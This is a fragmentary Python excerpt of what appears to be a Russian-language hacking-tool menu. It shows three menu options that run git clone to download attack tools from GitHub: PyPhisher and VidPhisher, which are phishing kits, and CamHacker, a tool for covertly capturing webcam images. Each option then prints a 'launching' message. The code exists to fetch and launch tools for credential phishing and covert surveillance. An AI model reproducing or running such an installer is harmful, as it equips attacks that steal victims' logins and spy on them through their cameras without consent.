...
while True:
    ...
    if inp == '3':
        ...
        if os.path.exists(filename):
            ...
            res()
            os.system('git clone --depth 1 https://github.com/KasRoudra/PyPhisher')
            print(Fore.WHITE+'', Style.BRIGHT)
            os.system('clear')
            print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
            time.sleep(0.5)
    ...
    if inp == '5':
        ...
        if os.path.exists(filename):
            ...
            res()
            os.system('git clone --depth 1 https://github.com/KasRoudra/CamHacker')
            print(Fore.WHITE+'', Style.BRIGHT)
            os.system('clear')
            print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
            time.sleep(0.5)
    ...
    if inp == '6':
        ...
        if os.path.exists(filename):
            ...
            res()
            os.system('git clone --depth 1 https://github.com/KasRoudra/VidPhisher')
            print(Fore.WHITE+'', Style.BRIGHT)
            os.system('clear')
            print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
            time.sleep(0.5)
